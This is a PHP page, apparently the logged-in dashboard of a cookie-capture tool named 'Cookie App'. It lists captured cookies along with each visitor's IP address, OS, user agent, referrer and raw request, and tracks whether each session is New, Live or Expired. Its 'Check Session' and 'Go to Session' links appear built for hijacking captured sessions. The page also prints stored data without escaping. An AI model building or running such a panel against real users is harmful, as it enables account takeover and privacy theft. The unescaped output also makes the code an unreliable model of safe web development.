<?php

include("config.php");

session_start();

$message = "";

if (isset($_SESSION["loggedin"]) && $_SESSION["loggedin"] == true) {
    ?>

    <!DOCTYPE html>
    <html lang="en-US">
    <head>
        <meta charset="UTF-8">
        <meta name="author" content="Awapt">
        <meta name="description" content="This is the description of the web application.">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css"
        integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm"
        crossorigin="anonymous">
        <title>Cookie App | View</title>
    </head>
    <body>
        <nav class="navbar navbar-expand-lg navbar-dark bg-secondary">
            <a class="navbar-brand" href="/cookie4/index.php">Cookie App</a>
            <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarTogglerDemo02"
            aria-controls="navbarTogglerDemo02" aria-expanded="false" aria-label="Toggle navigation">
            <span class="navbar-toggler-icon"></span>
        </button>

        <div class="collapse navbar-collapse" id="navbarTogglerDemo02">
            <ul class="navbar-nav mr-auto mt-2 mt-lg-0">
                <li class="nav-item active">
                    <a class="nav-link" href="/cookie4/index.php">Home</a>
                </li>
                <li class="nav-item active">
                    <a class="nav-link" href="/cookie4/logout.php">Logout</a>
                </li>
            </ul>
            <form class="form-inline my-2 my-lg-0" method="GET" action="#">
                <input class="form-control mr-sm-2" type="search" placeholder="Search">
                <button type="submit" class="btn btn-primary my-2 my-sm-0" id="search" name="search">Search</button>
            </form>
        </div>
    </nav>
    <div class="container-fluid">
        <div class="row">
            &nbsp;
        </div>
        <div class="row">
            <p class="display-4">View Cookies</p>
            <div class="col-sm-12">
                &nbsp;
            </div>
            <div class="col-sm-12">
                <table class="table table-sm table-hover">
                    <caption>List of Sessions</caption>
                    <thead class="thead-dark">
                        <tr>
                            <th>#</th>
                            <th>IP</th>
                            <th>Cookie</th>
                            <th>Date</th>
                            <th>State</th>
                            <th>Action</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php
                        $query = "Select * from cookies order by State, Date desc";
                        $rows = $conn->query($query);

                        if (!$rows) {
                            die("Error: " . $conn->error);
                        } else {
                            while ($row = $rows->fetch_object()) {
                                ?>
                                <tr>
                                    <th scope="row"><?php echo $row->Id; ?></th>
                                    <td><?php echo $row->IP; ?></td>
                                    <td><?php echo $row->Cookie; ?></td>
                                    <td><?php echo $row->Date; ?></td>
                                    <td><?php
                                    $state = $row->State;
                                    if ($state == 1) {
                                        $state = "<span class=\"badge badge-danger\">New</span>";
                                        echo $state;
                                    } else if ($state == 2) {
                                        $state = "<span class=\"badge badge-success\">Live</span>";
                                        echo $state;
                                    } else {
                                        $state = "<span class=\"badge badge-secondary\">Expired</span>";
                                        echo $state;
                                    } ?>
                                </td>
                                <td>
                                    <div class="btn-group">
                                        <button type="button" class="btn btn-warning dropdown-toggle"
                                        data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">More
                                    </button>
                                    <div class="dropdown-menu">
                                        <a href="#model-<?php echo $row->Id; ?>" role="button" class="dropdown-item"
                                           data-toggle="modal">View details</a>
                                           <a href="/cookie4/request.php?id=<?php echo $row->Id; ?>&action=check&cookie=<?php echo $row->Cookie; ?>"
                                               role="button" class="dropdown-item">Check Session</a>
                                               <a href="/cookie4/show.php?id=<?php echo $row->Id; ?>&action=go&cookie=<?php echo $row->Cookie; ?>"
                                                   role="button" class="dropdown-item">Go to Session</a>
                                                   <div class="dropdown-divider"></div>
                                                   <li>
                                                    <a href="/cookie4/request.php?id=<?php echo $row->Id; ?>&action=delete&cookie=<?php echo $row->Cookie; ?>"
                                                       role="button" class="dropdown-item">Delete Session</a>
                                                   </div>
                                               </div>
                                               <!-- The Modal -->
                                               <div class="modal fade" id="model-<?php echo $row->Id; ?>" tabindex="-1"
                                                 role="dialog" aria-labelledby="exampleModalScrollableTitle" aria-hidden="true">
                                                 <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
                                                    <div class="modal-content">
                                                        <div class="modal-header">
                                                            <h4 class="modal-title">Request Details</h4>
                                                            <button type="button" class="close" data-dismiss="modal">&times;
                                                            </button>
                                                        </div>
                                                        <div class="modal-body">
                                                            <span class="badge badge-primary">Request ID</span>
                                                            <span class="label label-default"><?php echo $row->Id; ?></span><br/>
                                                            <span class="badge badge-primary">State</span>
                                                            <span class="label label-default">
                                                               <?php
                                                               $state = $row->State;
                                                               if ($state == 1) {
                                                                   $state = "<span class=\"badge badge-danger\">New</span>";
                                                                   echo $state;
                                                               } else if ($state == 2) {
                                                                   $state = "<span class=\"badge badge-success\">Live</span>";
                                                                   echo $state;
                                                               } else {
                                                                   $state = "<span class=\"badge badge-secondary\">Expired</span>";
                                                                   echo $state;
                                                               } ?>
                                                           </span><br/>
                                                           <span class="badge badge-primary">Date</span>
                                                           <?php echo $row->Date; ?><br/>
                                                           <span class="badge badge-primary">IP Address</span>
                                                           <?php echo $row->IP; ?><br/>
                                                           <span class="badge badge-primary">Cookie</span>
                                                           <?php echo $row->Cookie; ?><br/>
                                                           <span class="badge badge-primary">OS</span>
                                                           <?php echo $row->Os; ?><br/>
                                                           <span class="badge badge-primary">User-Agent Short</span>
                                                           <?php echo $row->UAshort; ?><br/>
                                                           <span class="badge badge-primary">User-Agent Long</span>
                                                           <?php echo $row->UAlong; ?><br/>
                                                           <span class="badge badge-primary">Device</span>
                                                           <?php echo $row->Device; ?><br/>
                                                           <span class="badge badge-primary">Referrer</span>
                                                           <?php echo $row->Referrer; ?><br/>
                                                           <span class="badge badge-primary">Request</span><br/>
                                                           <pre><code><?php echo $row->Request; ?></pre>
                                                           </code><br/>
                                                       </div>
                                                       <div class="modal-footer">
                                                        <button type="button" class="btn btn-primary" data-dismiss="modal">
                                                            OK
                                                        </button>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                    </td>
                                </tr>
                                <?php
                            }
                        }
                        ?>
                    </tbody>
                </table>
            </div>
        </div>
        <div class="row">
            <div class="col-sm-12">
                &nbsp;
            </div>
            <div class="col">
                &nbsp;
            </div>
            <div class="col-sm-6">
                <!-- Uyarilar buraya gelecek -->
            </div>
            <div class="col">
                &nbsp;
            </div>
        </div>
    </div>
    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js"
    integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN"
    crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js"
    integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q"
    crossorigin="anonymous"></script>
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js"
    integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl"
    crossorigin="anonymous"></script>
</body>
</html>

<?php
} else {
    $conn->close();
    header("Location: /cookie4/login.php");
    exit();
}
?>